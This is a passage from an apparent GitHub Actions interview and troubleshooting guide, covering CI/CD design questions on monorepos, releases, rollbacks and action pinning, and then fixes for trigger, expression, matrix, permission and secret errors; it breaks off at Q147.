2. In a staging cluster: uninstall scale sets (running jobs finish first since ephemeral runners drain), upgrade the controller with new CRDs, reinstall scale sets with the same names.
3. Roll cluster by cluster during low traffic; with two clusters serving the same scale set name via different runner groups, shift load first.
4. Validate with a canary workflow that targets each scale set.

**Why →** Version skew between controller and scale set is a common source of listener failures.

**Interview tip →** Mention pinning `--version` for both charts.

</details>

### Q91. A monorepo has 30 services; every PR builds all of them. Redesign. 🔴

<details>
<summary><b>Answer</b></summary>

**Situation read →** Need change detection with dependency awareness.

**What I'd do →**
1. `changes` job computes affected services: path filters per service including shared libs, or `nx show projects --affected --base=origin/main --json`.
2. Dynamic matrix build with `fromJSON`, guarded against empty lists.
3. Per-service Docker cache scope.
4. Fan-in `ci-ok` as the only required check.
5. Nightly full build to catch anything the graph missed.

**Why →** Typical PRs touch one or two services, cutting time and cost dramatically.

**Interview tip →** Mention the nightly full build as a safety net.

</details>

### Q92. A monorepo deploys each service independently with its own version. How do you trigger and version releases? 🔴

<details>
<summary><b>Answer</b></summary>

**Situation read →** Per-package versioning.

**What I'd do →**
1. Tags with prefixes: `api-v1.4.0`, `web-v2.1.0`; trigger `on: push: tags: ["*-v*"]`.
2. Parse service and version: `svc=${GITHUB_REF_NAME%-v*}; ver=${GITHUB_REF_NAME##*-v}`.
3. Or release-please in manifest mode (`release-please-config.json` with packages), creating per-package release PRs and tags.
4. Deploy only the tagged service via the reusable deploy workflow.

**Why →** Independent tags keep changelogs and rollbacks per service.

**Interview tip →** Mention release-please manifest mode for monorepos.

</details>

### Q93. Design a release workflow for a CLI tool that publishes binaries for Linux, macOS and Windows. 🟡

<details>
<summary><b>Answer</b></summary>

**Situation read →** Cross-compile, checksum, sign, publish.

**What I'd do →**
1. Trigger on tags `v*.*.*`.
2. Matrix build (or GoReleaser in one job for Go), upload artifacts per platform.
3. Fan-in job downloads with `merge-multiple: true`, generates `checksums.txt`, attests provenance, and runs `gh release create "$GITHUB_REF_NAME" dist/* --generate-notes --verify-tag`.
4. Publish to Homebrew tap via App token.

**Why →** Fan-in keeps release creation atomic with all assets.

**Interview tip →** Mention checksums and provenance as part of "done".

</details>

### Q94. Releases are currently manual: someone edits the version, writes notes and tags. Automate it. 🟡

<details>
<summary><b>Answer</b></summary>

**Situation read →** Adopt Conventional Commits and a release tool.

**What I'd do →**
1. Enforce Conventional Commit PR titles with a check and squash merges.
2. release-please on `main` maintains a release PR with version bump and changelog.
3. Merging it creates tag and release (App token so downstream workflows trigger).
4. Release workflow retags the tested image and deploys to prod with approval.

**Why →** Versioning becomes a reviewable PR instead of tribal knowledge.

**Interview tip →** Explain why the App token is needed: `GITHUB_TOKEN` tags do not trigger workflows.

</details>

### Q95. You want CD to stop at staging and let prod be promoted later by tagging. How do you design the image flow? 🟡

<details>
<summary><b>Answer</b></summary>

**Situation read →** Promotion by digest.

**What I'd do →**
1. `main`: build, scan, push `sha-<short>`, deploy dev then staging.
2. Tag `v1.5.0` on a commit that passed staging.
3. Release workflow: verify image `sha-<short>` exists, add tag `v1.5.0` to the same manifest (ECR `put-image`), create release, deploy prod by digest.

**Why →** Prod gets exactly what staging tested, and tags are just names on the same digest.

**Interview tip →** Mention verifying the commit actually passed staging (check deployment status via API) before promoting.

</details>

### Q96. You have to roll back prod quickly. How should your workflows support that? 🟢

<details>
<summary><b>Answer</b></summary>

**Situation read →** Rollback must be a known, rehearsed path.

**What I'd do →**
1. `workflow_dispatch` "Rollback" taking a previous version or digest, calling the same reusable deploy workflow (same approvals, possibly a faster emergency environment).
2. In-job automatic rollback on failed rollout: `kubectl rollout undo` if `rollout status` fails.
3. Keep previous images (ECR lifecycle policy retains enough releases).

**Why →** Rollback is just a deploy of an older digest when you build once and promote.

**Interview tip →** Rehearse it; a rollback path never tested is not a rollback path.

</details>

### Q97. A self-hosted Windows runner fleet is needed for .NET Framework builds. What do you watch out for? 🟡

<details>
<summary><b>Answer</b></summary>

**Situation read →** Windows-specific runner operations.

**What I'd do →**
1. Ephemeral VMs from a golden image (Packer) with Visual Studio Build Tools, autoscaled via a VMSS or similar.
2. Run the runner as a service with a low-privilege account.
3. Use `shell: pwsh` and paths with care; long path support enabled.
4. Patch images monthly; keep runner auto-update enabled or rebuild images on new runner releases.

**Why →** Windows has no ARC-style container story for .NET Framework, so VM images are the unit.

**Interview tip →** Mention that runners too far behind the latest version stop receiving jobs.

</details>

### Q98. Jobs need GPUs only for a weekly benchmark. Cheapest setup? 🟢

<details>
<summary><b>Answer</b></summary>

**Situation read →** Rare, expensive hardware.

**What I'd do →**
1. GitHub-hosted GPU larger runner, billed per minute, used only in that workflow.
2. Or ARC GPU scale set with `minRunners: 0` on a GPU node pool that scales from zero.
3. `timeout-minutes` strict, schedule plus dispatch triggers.

**Why →** Paying per minute for weekly use beats any always-on GPU host.

**Interview tip →** Tie infrastructure choice to utilization.

</details>

### Q99. A release must publish to npm with provenance. What does the workflow need? 🔴

<details>
<summary><b>Answer</b></summary>

**Situation read →** npm provenance uses GitHub OIDC.

**What I'd do →**
1. Workflow:
   ```yaml
   permissions:
     contents: read
     id-token: write
   steps:
     - uses: actions/checkout@v4
     - uses: actions/setup-node@v4
       with: { node-version: 22, registry-url: "https://registry.npmjs.org" }
     - run: npm ci && npm publish --provenance --access public
       env:
         NODE_AUTH_TOKEN: ${{ secrets.NPM_TOKEN }}
   ```
2. Better: npm trusted publishing (OIDC) configured on npmjs.com for the repo and workflow, removing `NPM_TOKEN` entirely.

**Why →** Provenance links the package to the source and build; trusted publishing removes the long-lived token.

**Interview tip →** Mention trusted publishing exists for npm and PyPI now.

</details>

### Q100. You inherit 200 repos with unpinned actions. Plan an org-wide pinning rollout. 🔴

<details>
<summary><b>Answer</b></summary>

**Situation read →** Scale problem; must not break builds.

**What I'd do →**
1. Inventory with code search or a script over `.github/workflows/*.yml` to list `uses:` refs.
2. Use a pinning tool (`pinact run` or `ratchet pin`) in a scripted PR per repo, adding version comments.
3. Add Dependabot config for `github-actions` in the same PR so pins stay current.
4. Merge in waves; then enable the org policy requiring SHA pinning.

**Why →** Automation makes it tractable; policy keeps it true after rollout.

**Interview tip →** "Fix existing, keep current with Dependabot, enforce with policy."

</details>

---

# Part 2: Troubleshooting

## Workflows Not Triggering & Invalid Files

<!-- DEVOPS-SHACK:SECTION -->
> 🎥 **Learn this hands-on with DevOps Shack** → [YouTube @devopsshack](https://www.youtube.com/@devopsshack) · [Hindi @shackverse](https://www.youtube.com/@shackverse) · [Courses at devopsshack.com](https://devopsshack.com)

### Q101. You pushed a new workflow file and nothing appears in the Actions tab. 🟢

<details>
<summary><b>Answer</b></summary>

**Likely causes →** File not directly in `.github/workflows/` (subfolder or typo like `.github/workflow/`), wrong extension, YAML error, `on` filters do not match the push, or Actions disabled for the repo.

**Diagnose →**
```bash
git ls-files .github/workflows
actionlint .github/workflows/ci.yml
gh api repos/ORG/REPO/actions/permissions --jq .enabled
```

**Fix →** Move the file to `.github/workflows/`, fix the YAML, broaden filters, or enable Actions in Settings.

**Prevent →** Run `actionlint` in pre-commit and in CI for `.github/**` changes.

</details>

### Q102. `Invalid workflow file: .github/workflows/ci.yml#L14 You have an error in your yaml syntax on line 14` 🟢

<details>
<summary><b>Answer</b></summary>

**Likely causes →** Tabs instead of spaces, bad indentation, an unquoted value starting with `!`, `*`, `{` or `:` inside a string, or a `${{ }}` expression starting a value that YAML treats as a mapping.

**Diagnose →**
```bash
yq '.' .github/workflows/ci.yml >/dev/null
actionlint .github/workflows/ci.yml
sed -n '10,16p' .github/workflows/ci.yml | cat -A   # shows tabs as ^I
```

**Fix →** Use spaces, quote strings with special characters, wrap `if: ${{ !cond }}`.

**Prevent →** Editor YAML schema validation for GitHub workflows plus actionlint.

</details>

### Q103. `The workflow is not valid. .github/workflows/ci.yml (Line: 9, Col: 5): Unexpected value 'steps'` 🟢

<details>
<summary><b>Answer</b></summary>

**Likely causes →** `steps` placed at the wrong level (under `on` or directly under `jobs` instead of under a job id), or a job that uses `uses:` (reusable workflow call) also has `steps` or `runs-on`.

**Diagnose →**
```bash
yq '.jobs | keys' .github/workflows/ci.yml
yq '.jobs.build | keys' .github/workflows/ci.yml
```

**Fix →** Nest as `jobs.<id>.runs-on` and `jobs.<id>.steps`. For reusable workflow calls, move steps into the called workflow.

**Prevent →** actionlint reports the exact key and allowed alternatives.

</details>

### Q104. The workflow runs on push to `main` but never on pull requests. 🟢

<details>
<summary><b>Answer</b></summary>

**Likely causes →** `pull_request.branches` lists the head branch instead of the base, the PR is a draft and jobs skip drafts, the PR has merge conflicts (no merge commit can be created, so `pull_request` runs do not start), or path filters exclude the changed files.

**Diagnose →**
```bash
yq '.on' .github/workflows/ci.yml
gh pr view 42 --json mergeable,isDraft,baseRefName,files
```

**Fix →** Filter by base branch (`branches: [main]`), resolve conflicts, adjust `paths`.

**Prevent →** Document that `branches` under `pull_request` means target branch.

</details>

### Q105. The "Run workflow" button for `workflow_dispatch` does not appear. 🟢

<details>
<summary><b>Answer</b></summary>

**Likely causes →** The workflow with `workflow_dispatch` exists only on a feature branch, not on the default branch; or the file has a syntax error on the default branch.

**Diagnose →**
```bash
git show origin/main:.github/workflows/deploy.yml | yq '.on'
gh workflow list --all
```

**Fix →** Merge the workflow to the default branch; then you can dispatch it on any ref. From the CLI, `gh workflow run deploy.yml --ref feature/x` also works once the default branch knows the workflow.

**Prevent →** Add new manual workflows to the default branch first with a no-op job.

</details>

### Q106. A scheduled workflow stopped running weeks ago, no errors. 🟢

<details>
<summary><b>Answer</b></summary>

**Likely causes →** In a public repo, schedules are disabled after 60 days of no repository activity ("This scheduled workflow is disabled because there hasn't been activity in this repository for at least 60 days"). Or the workflow was disabled manually, or the cron was edited on a non-default branch.

**Diagnose →**
```bash
gh workflow list --all
gh workflow view nightly.yml
```

**Fix →** `gh workflow enable nightly.yml`; make sure the schedule is on the default branch.

**Prevent →** Monitor critical schedules with a heartbeat (the job pings a dead-man's switch like Healthchecks.io).

</details>

### Q107. A cron set to `0 9 * * *` runs at 14:30 local time, and sometimes 15 minutes late. 🟢

<details>
<summary><b>Answer</b></summary>

**Likely causes →** Cron is UTC (09:00 UTC is 14:30 IST), and scheduled runs are queued best-effort, delayed at the top of the hour when load peaks.

**Diagnose →**
```bash
gh run list --workflow nightly.yml --json createdAt --limit 10
```

**Fix →** Convert to UTC (`30 3 * * *` for 09:00 IST) and pick an off-peak minute like `17`.

**Prevent →** Comment the local time next to every cron line.

</details>

### Q108. Pushing a release tag did not trigger the `on: push: tags: ['v*']` workflow. 🟡

<details>
<summary><b>Answer</b></summary>

**Likely causes →** The tag was created by a workflow using `GITHUB_TOKEN` (no new runs), more than three tags were pushed at once, the tag name does not match the glob, or the workflow file does not exist at the tagged commit.

**Diagnose →**
```bash
git ls-remote --tags origin | tail
git show v1.4.0:.github/workflows/release.yml | head
gh api repos/ORG/REPO/git/refs/tags/v1.4.0
```

**Fix →** Push tags individually (`git push origin v1.4.0`), create tags with a GitHub App token, or dispatch the release workflow explicitly.

**Prevent →** Use release-please or a release workflow that calls downstream workflows with `workflow_call`.

</details>

### Q109. A workflow with `paths: ['src/**']` did not run for a PR that changed `src/app.js`. 🟡

<details>
<summary><b>Answer</b></summary>

**Likely causes →** The PR changes more than 300 files and `src/app.js` is not in the first 300 evaluated, the PR is from a branch with a weird base, or another filter (`branches`) does not match.

**Diagnose →**
```bash
gh pr view 42 --json files --jq '.files | length'
gh pr view 42 --json baseRefName
```

**Fix →** Split huge PRs, or drop workflow-level path filters for required workflows and filter at job level.

**Prevent →** Avoid relying on path filters for correctness; use them for cost only.

</details>

### Q110. PR shows "Expected — Waiting for status to be reported" for a required check and can never merge. 🟡

<details>
<summary><b>Answer</b></summary>

**Likely causes →** The workflow providing the check was skipped (path filters, `[skip ci]`, branch filters), the job name changed (matrix values or `name:`), or the check runs under a different name in a reusable workflow (`caller / called`).

**Diagnose →**
```bash
gh pr checks 42
gh api repos/ORG/REPO/branches/main/protection/required_status_checks --jq .contexts
```

**Fix →** Make the required check a fan-in job that always runs; update the protection context to the actual name.

**Prevent →** One stable required check (`ci-ok`), and never workflow-level path filters on it.

</details>

### Q111. `No event triggers defined in "on"` 🟢

<details>
<summary><b>Answer</b></summary>

**Likely causes →** `on:` is empty, misspelled (`On:` or `trigger:`), or indentation placed events under another key. In YAML 1.1, unquoted `on` can parse as boolean `true` in some tools, but GitHub handles it; the problem is usually structure.

**Diagnose →**
```bash
yq '.on' .github/workflows/ci.yml
```

**Fix →** Add at least one event under `on:`, correctly indented.

**Prevent →** actionlint.

</details>

### Q112. `Error: Unable to resolve action 'actions/checkout@v5.9', unable to find version 'v5.9'` 🟢

<details>
<summary><b>Answer</b></summary>

**Likely causes →** The tag, branch or SHA does not exist (typo or invented version), or the SHA was a short SHA (only full 40-character SHAs are accepted for pinning).

**Diagnose →**
```bash
gh api repos/actions/checkout/tags --jq '.[].name' | head
gh api repos/actions/checkout/commits/<sha> --jq .sha
```

**Fix →** Use an existing tag or the full SHA.

**Prevent →** Let Dependabot or Renovate manage action versions.

</details>

### Q113. `Can't find 'action.yml', 'action.yaml' or 'Dockerfile' under '/home/runner/work/app/app/.github/actions/setup'. Did you forget to run actions/checkout before running your local action?` 🟢

<details>
<summary><b>Answer</b></summary>

**Likely causes →** A local action (`uses: ./.github/actions/setup`) referenced before checkout, wrong path or file name, or checkout with `sparse-checkout` that excluded `.github`.

**Diagnose →**
```bash
git ls-files .github/actions
```

**Fix →** Put `actions/checkout` first; correct the path; include `.github` in sparse patterns.

**Prevent →** Keep local actions under a consistent `.github/actions/<name>/action.yml` layout.

</details>

### Q114. `error parsing called workflow ".github/workflows/deploy.yml": workflow is not reusable as it is missing a `on.workflow_call` trigger` 🟢

<details>
<summary><b>Answer</b></summary>

**Likely causes →** The target workflow lacks `on: workflow_call`, or the ref used in `uses:` points to a version before you added it.

**Diagnose →**
```bash
git show origin/main:.github/workflows/deploy.yml | yq '.on'
```

**Fix →** Add `workflow_call` with the inputs the caller passes; reference the right ref.

**Prevent →** Test reusable workflows with a caller in the same repo in CI.

</details>

### Q115. `Invalid input, environment is not defined in the referenced workflow.` when calling a reusable workflow 🟡

<details>
<summary><b>Answer</b></summary>

**Likely causes →** The caller passes `with: environment: dev` but the called workflow's `workflow_call.inputs` does not declare `environment`, or names differ in case or spelling (`env` vs `environment`). Same pattern for secrets not declared.

**Diagnose →**
```bash
yq '.on.workflow_call.inputs | keys' .github/workflows/deploy.yml
```

**Fix →** Declare every input and secret the caller passes, or stop passing it.

**Prevent →** Treat `workflow_call` inputs as an API and document them in the file header.

</details>

### Q116. The workflow on a fork PR shows "This workflow is awaiting approval from a maintainer". 🟢

<details>
<summary><b>Answer</b></summary>

**Likely causes →** Repository setting requires approval for fork PR workflows from first-time contributors or all outside collaborators.

**Diagnose →** Settings, Actions, General, "Approval for running fork pull request workflows from contributors".

**Fix →** Review the PR diff (especially workflow and build files), then "Approve and run".

**Prevent →** Keep approval on for public repos; it is a guard against crypto-mining and abuse.

</details>

### Q117. A workflow file change in a PR does not take effect; the old behaviour runs. 🟡

<details>
<summary><b>Answer</b></summary>

**Likely causes →** The trigger reads the workflow from the default branch: `pull_request_target`, `workflow_run`, `issue_comment`, `schedule`. Or you re-ran an old run, which reuses the original workflow file.

**Diagnose →** Check the trigger; check the run's commit and attempt number (`gh run view <id> --json headSha,attempt`).

**Fix →** Merge the change to the default branch for those triggers; push a new commit instead of re-running.

**Prevent →** Know which events use base vs head workflow definitions.

</details>

### Q118. `The workflow is not valid. ... (Line: 22, Col: 16): Unrecognized named-value: 'env'. Located at position 1 within expression: env.RUNNER` 🟡

<details>
<summary><b>Answer</b></summary>

**Likely causes →** `env` context used where it is not available, such as `runs-on`, job-level `if`, `concurrency` at workflow level, or `services`.

**Diagnose →** Check the context availability table for that key.

**Fix →** Use `vars.RUNNER` or `inputs.runner` for `runs-on`, move the condition to step level, or compute the value in an earlier job and pass via `needs`.

**Prevent →** actionlint knows context availability and catches this before pushing.

</details>

---

## Expressions, Outputs, Matrix & Conditions

<!-- DEVOPS-SHACK:SECTION -->
> 🎥 **Learn this hands-on with DevOps Shack** → [YouTube @devopsshack](https://www.youtube.com/@devopsshack) · [Hindi @shackverse](https://www.youtube.com/@shackverse) · [Courses at devopsshack.com](https://devopsshack.com)

### Q119. A downstream job reads `needs.build.outputs.digest` and gets an empty string. 🟡

<details>
<summary><b>Answer</b></summary>

**Likely causes →** The job did not declare `outputs:` mapping, the step lacks an `id`, the step wrote to `$GITHUB_OUTPUT` with wrong format (spaces around `=`), the output name differs, or the output was dropped because it contained a secret.

**Diagnose →**
```bash
gh run view <id> --log | grep -i "skip output"
yq '.jobs.build.outputs' .github/workflows/cd.yml
```

**Fix →** Map `outputs: digest: ${{ steps.push.outputs.digest }}`, give the step `id: push`, write `echo "digest=$D" >> "$GITHUB_OUTPUT"`.

**Prevent →** Print outputs to `$GITHUB_STEP_SUMMARY` in the producing job during development.

</details>

### Q120. `Warning: Skip output 'image' since it may contain secret.` 🔴

<details>
<summary><b>Answer</b></summary>

**Likely causes →** The value contains a registered secret or masked string, often the AWS account ID (part of the ECR registry) because someone stored the account ID as a secret, or `configure-aws-credentials` was told to mask the account ID (`mask-aws-account-id: true`).

**Diagnose →** Check which secrets or masks overlap with the value.

**Fix →** Store account IDs as variables, leave account-ID masking off on `configure-aws-credentials` if your policy allows, or output only the non-sensitive part (digest) and rebuild the full reference downstream.

**Prevent →** Do not register non-secret identifiers as secrets.

</details>

### Q121. `Error: Unable to process file command 'output' successfully. Error: Invalid format '  "items": ['` 🟡

<details>
<summary><b>Answer</b></summary>

**Likely causes →** Multiline value (pretty JSON) written as `name=value` without the delimiter syntax.

**Diagnose →** Look at how the step writes the output.

**Fix →** Compact the JSON (`jq -c`) or use a delimiter:
```bash
echo "matrix=$(jq -c . matrix.json)" >> "$GITHUB_OUTPUT"
```

**Prevent →** Always `jq -c` JSON destined for outputs.

</details>

### Q122. `Error when evaluating 'strategy' for job 'build'. .github/workflows/ci.yml (Line: 30, Col: 15): Matrix vector 'service' does not contain any values` 🟡

<details>
<summary><b>Answer</b></summary>

**Likely causes →** The dynamic matrix list is empty (`[]`), usually because no services changed.

**Diagnose →** Print `needs.changes.outputs.services` in the summary.

**Fix →**
```yaml
build:
  needs: changes
  if: needs.changes.outputs.services != '[]' && needs.changes.outputs.services != ''
```

**Prevent →** Always guard dynamic matrices and keep a fan-in job that accepts `skipped`.

</details>

### Q123. `Error reading JToken from JsonReader. Path '', line 0, position 0.` 🔴

<details>
<summary><b>Answer</b></summary>

**Likely causes →** `fromJSON('')`: the output feeding `fromJSON` is empty because the upstream job or step was skipped, failed or the output name is wrong.

**Diagnose →** Check upstream job status and whether the output is set.

**Fix →** Fix the output; guard with `if` on non-empty; or provide a default: `fromJSON(needs.plan.outputs.matrix || '{"include":[]}')`, plus an empty-matrix guard.

**Prevent →** Validate JSON in the producing step with `jq -e .`.

</details>

### Q124. `if: github.event.inputs.deploy == true` never runs the step, even when the box is ticked. 🟢

<details>
<summary><b>Answer</b></summary>

**Likely causes →** `github.event.inputs` values are strings; `'true' == true` is false after numeric coercion.

**Diagnose →** Dump `toJSON(github.event.inputs)` and `toJSON(inputs)`.

**Fix →** `if: inputs.deploy` (typed) or `if: github.event.inputs.deploy == 'true'`.

**Prevent →** Use the `inputs` context everywhere.

</details>

### Q125. Deploy job is always "skipped" even though build succeeded. 🟡

<details>
<summary><b>Answer</b></summary>

**Likely causes →** Another job in `needs` was skipped (path filter or condition), which skips dependents; or the `if` expression is false (wrong ref comparison like `github.ref == 'main'`).

**Diagnose →**
```bash
gh run view <id> --json jobs --jq '.jobs[] | {name, conclusion}'
```

**Fix →** Compare full refs (`refs/heads/main`) or use `github.ref_name == 'main'`; handle skipped needs with `if: ${{ !cancelled() && needs.build.result == 'success' }}`.

**Prevent →** Dump `toJSON(needs)` in a debug step when designing conditions.

</details>

### Q126. A notification step with `if: always()` posted "failed" even when the run was cancelled by a newer commit. 🟢

<details>
<summary><b>Answer</b></summary>

**Likely causes →** `always()` runs on cancel too, and the script assumed non-success meant failure.

**Diagnose →** Check `job.status` in the step: `cancelled`.

**Fix →** Use `if: failure()` for failure alerts, or `if: ${{ !cancelled() }}` with status-specific messages.

**Prevent →** Reserve `always()` for cleanup.

</details>

### Q127. A matrix job's output used downstream has a different value on each run. 🔴

<details>
<summary><b>Answer</b></summary>

**Likely causes →** All matrix legs write the same job output; the last leg to finish wins.

**Diagnose →** Compare leg finish times with the value.

**Fix →** Per-leg artifacts (`digest-${{ matrix.arch }}`) collected by a fan-in job, or separate non-matrix jobs when values must be distinct.

**Prevent →** Never consume job outputs from matrix jobs as if they were single values.

</details>

### Q128. `$GITHUB_ENV` variable set in one step is empty in the same step. 🟢

<details>
<summary><b>Answer</b></summary>

**Likely causes →** `GITHUB_ENV` writes take effect in subsequent steps only.

**Diagnose →** Check where the variable is read.

**Fix →** Also `export` it in the current step, or read it in the next step.

**Prevent →** Remember: env files apply to later steps.

</details>

### Q129. `$GITHUB_ENV` value set in the build job is empty in the deploy job. 🟢

<details>
<summary><b>Answer</b></summary>

**Likely causes →** `GITHUB_ENV` is per job; jobs run on different runners.

**Diagnose →** Check job boundaries.

**Fix →** Use job outputs and `needs`, or an artifact.

**Prevent →** Draw the job graph and mark how data crosses each edge.

</details>

### Q130. A step with `run: npm test | tee test.log` passes even though tests failed. 🟡

<details>
<summary><b>Answer</b></summary>

**Likely causes →** Default shell is `bash -e {0}` without `pipefail`, so the pipeline's exit code is `tee`'s (0).

**Diagnose →** Check the "Run" header in logs: `shell: /usr/bin/bash -e {0}`.

**Fix →** Set `shell: bash` (adds `-o pipefail`) on the step or in `defaults.run`, or `set -o pipefail` in the script.

**Prevent →** Workflow-level `defaults: run: shell: bash`.

</details>

### Q131. `if: contains(github.event.pull_request.labels, 'deploy')` never matches. 🟢

<details>
<summary><b>Answer</b></summary>

**Likely causes →** `labels` is an array of objects, not strings.

**Diagnose →** `echo '${{ toJSON(github.event.pull_request.labels) }}'` via env.

**Fix →** `contains(github.event.pull_request.labels.*.name, 'deploy')`.

**Prevent →** Use object filters for arrays of objects.

</details>

### Q132. A ternary `${{ inputs.replicas && inputs.replicas || 2 }}` returns 2 when replicas is 0. 🟡

<details>
<summary><b>Answer</b></summary>

**Likely causes →** `0` is falsy, so `cond && a || b` falls through to `b`.

**Diagnose →** Evaluate with sample values.

**Fix →** Use a default on the input itself (`default: 2`) and read `inputs.replicas` directly, or compute in a shell step.

**Prevent →** Keep the ternary idiom for string values that are never empty.

</details>

### Q133. `hashFiles('**/package-lock.json') couldn't finish within 120 seconds.` 🟡

<details>
<summary><b>Answer</b></summary>

**Likely causes →** Huge workspace (large `node_modules`, checked-out submodules, build outputs) scanned by the glob on a slow self-hosted disk.

**Diagnose →** `find . -name package-lock.json | wc -l` and workspace size with `du -sh`.

**Fix →** Narrow the pattern (`package-lock.json`, `services/*/package-lock.json`), exclude `!**/node_modules/**`, or compute the key in a step with `sha256sum`.

**Prevent →** Ephemeral runners with clean workspaces.

</details>

### Q134. `Unrecognized named-value: 'secrets'. Located at position 1 within expression: secrets.NPM_TOKEN != ''` 🟡

<details>
<summary><b>Answer</b></summary>

**Likely causes →** Secrets referenced directly in an `if:` condition.

**Diagnose →** Find the `if` with `secrets.`.

**Fix →**
```yaml
env:
  HAS_TOKEN: ${{ secrets.NPM_TOKEN != '' }}
steps:
  - if: env.HAS_TOKEN == 'true'
    run: npm publish
```

**Prevent →** actionlint flags this.

</details>

---

## Permissions, Tokens & Secrets

<!-- DEVOPS-SHACK:SECTION -->
> 🎥 **Learn this hands-on with DevOps Shack** → [YouTube @devopsshack](https://www.youtube.com/@devopsshack) · [Hindi @shackverse](https://www.youtube.com/@shackverse) · [Courses at devopsshack.com](https://devopsshack.com)

### Q135. `Error: Resource not accessible by integration` when a workflow tries to comment on a PR. 🟢

<details>
<summary><b>Answer</b></summary>

**Likely causes →** `GITHUB_TOKEN` lacks `pull-requests: write` (or `issues: write` for the issues comments API), a job-level `permissions` block replaced the workflow-level one, or the PR is from a fork so the token is read-only.

**Diagnose →** The "Set up job" log section lists "GITHUB_TOKEN Permissions". Check `github.event.pull_request.head.repo.fork`.

**Fix →** Add `permissions: pull-requests: write` to that job; for forks use the `workflow_run` two-workflow pattern.

**Prevent →** Declare permissions per job and test fork PRs in a sandbox repo.

</details>

### Q136. `remote: Permission to devopsshack/shack-api.git denied to github-actions[bot]. fatal: unable to access 'https://github.com/devopsshack/shack-api/': The requested URL returned error: 403` 🟢

<details>
<summary><b>Answer</b></summary>

**Likely causes →** Token has `contents: read` only (restricted default), the branch is protected and the bot is not allowed to push, or `persist-credentials: false` removed the credentials.

**Diagnose →** Check "GITHUB_TOKEN Permissions" in the log and branch protection or rulesets on the target branch.

**Fix →** `permissions: contents: write` for that job; push to an unprotected branch and open a PR; or use a GitHub App in the ruleset bypass list.

**Prevent →** Prefer PR-based automation over direct pushes to protected branches.

</details>

### Q137. `fatal: could not read Username for 'https://github.com': terminal prompts disabled` when cloning a second private repo. 🟢

<details>
<summary><b>Answer</b></summary>

**Likely causes →** `GITHUB_TOKEN` only covers the current repository; cloning another private repo has no credentials.

**Diagnose →** Check which repo the failing `git clone` or `actions/checkout` targets.

**Fix →**
```yaml
- id: app
  uses: actions/create-github-app-token@v2
  with:
    app-id: ${{ vars.APP_ID }}
    private-key: ${{ secrets.APP_KEY }}
    repositories: shared-config
- uses: actions/checkout@v4
  with:
    repository: devopsshack/shared-config
    token: ${{ steps.app.outputs.token }}
    path: shared-config
```

**Prevent →** Standardize on an org GitHub App for cross-repo access instead of PATs.

</details>

### Q138. A secret is empty in the workflow even though it is set in Settings. 🟢

<details>
<summary><b>Answer</b></summary>

**Likely causes →** Fork PR or Dependabot run (no Actions secrets), the secret is an environment secret but the job has no `environment`, an org secret not shared with this repo, a name mismatch, or a reusable workflow that was not passed the secret.

**Diagnose →**
```bash
gh secret list; gh secret list --env prod; gh secret list --org devopsshack
```
and `if [ -z "$X" ]; then echo "empty"; fi` in a step.

**Fix →** Bind the job to the environment, share the org secret with the repo, pass secrets explicitly or with `secrets: inherit`.

**Prevent →** Fail early with a clear message when a required secret is empty.

</details>

### Q139. `Error: Input required and not supplied: token` on a fork PR. 🟢

<details>
<summary><b>Answer</b></summary>

**Likely causes →** The step passes `token: ${{ secrets.SOME_PAT }}`, which is empty for forks.

**Diagnose →** Check whether the run is from a fork.

**Fix →** Skip the step for forks (`if: github.event.pull_request.head.repo.full_name == github.repository`) or use `github.token` where read access is enough.

**Prevent →** Design PR workflows to work without secrets.

</details>

### Q140. Releases created by a workflow do not trigger the `on: release` deploy workflow. 🟡

<details>
<summary><b>Answer</b></summary>

**Likely causes →** The release was created with `GITHUB_TOKEN`, and events from `GITHUB_TOKEN` do not start new runs.

**Diagnose →** Check the release author: `github-actions[bot]`.

**Fix →** Create releases with a GitHub App token, or call the deploy as a reusable workflow from the release workflow.

**Prevent →** Document the `GITHUB_TOKEN` no-trigger rule in your platform docs.

</details>

### Q141. `Error: HttpError: Resource not accessible by integration` when uploading SARIF to code scanning. 🟡

<details>
<summary><b>Answer</b></summary>

**Likely causes →** Missing `security-events: write`; on private repos, also `actions: read` for the upload action to read run info, and code scanning (GitHub Advanced Security) not enabled.

**Diagnose →** Check permissions block and repo security settings.

**Fix →**
```yaml
permissions:
  contents: read
  security-events: write
  actions: read
```

**Prevent →** Use a shared scan workflow with correct permissions baked in.

</details>

### Q142. `denied: permission_denied: write_package` when pushing to GHCR. 🟡

<details>
<summary><b>Answer</b></summary>

**Likely causes →** Missing `packages: write`, the package exists but is not linked to this repo (created by another repo or a user), or the image name has uppercase letters.

**Diagnose →** Package settings, "Manage Actions access" list; check image name casing.

**Fix →** Add `packages: write`, grant the repo write access in package settings, lowercase the name (`${GITHUB_REPOSITORY,,}`).

**Prevent →** Add `org.opencontainers.image.source` label so packages link to the repo automatically.

</details>

### Q143. A secret appears in plain text in the logs despite masking. 🟡

<details>
<summary><b>Answer</b></summary>

**Likely causes →** The printed form differs from the registered value: base64, JSON-escaped, URL-encoded, a substring, or with trailing newline differences; or the value was generated at runtime and never masked.

**Diagnose →** Find the step and the transformation.

**Fix →** Rotate immediately, delete the run logs, add `::add-mask::` for runtime and derived values, remove `set -x`.

**Prevent →** Never echo secrets; review debug output before enabling `ACTIONS_STEP_DEBUG` on sensitive workflows.

</details>

### Q144. `gh: To use GitHub CLI in a GitHub Actions workflow, set the GH_TOKEN environment variable.` 🟢

<details>
<summary><b>Answer</b></summary>

**Likely causes →** `gh` does not pick up the token automatically.

**Diagnose →** Check the step's env.

**Fix →**
```yaml
- run: gh pr comment "$PR" --body "Deployed"
  env:
    GH_TOKEN: ${{ github.token }}
    PR: ${{ github.event.pull_request.number }}
```

**Prevent →** Set `GH_TOKEN` at job level in workflows that use `gh` heavily.

</details>

### Q145. `actions/checkout` fails with `remote: Repository not found.` on a private repo after adding a job-level `permissions` block. 🟡

<details>
<summary><b>Answer</b></summary>

**Likely causes →** The job block replaced the workflow block and did not include `contents: read`, so the token cannot read the repo.

**Diagnose →** "GITHUB_TOKEN Permissions" in the log shows `Contents: none`.

**Fix →** Add `contents: read` to the job's permissions.

**Prevent →** Remember job-level permissions replace, not merge.

</details>

### Q146. A workflow can no longer cancel or re-run other workflows: `Resource not accessible by integration` on the actions API. 🟡

<details>
<summary><b>Answer</b></summary>

**Likely causes →** Missing `actions: write` after switching to restricted default permissions.

**Diagnose →** Check the API call and permissions.

**Fix →** Add `permissions: actions: write` to that job only.

**Prevent →** Inventory which jobs use which APIs when tightening defaults.

</details>

### Q147. An org secret is visible to the repo in Settings but empty in a private repo's workflow. 🟡

<details>
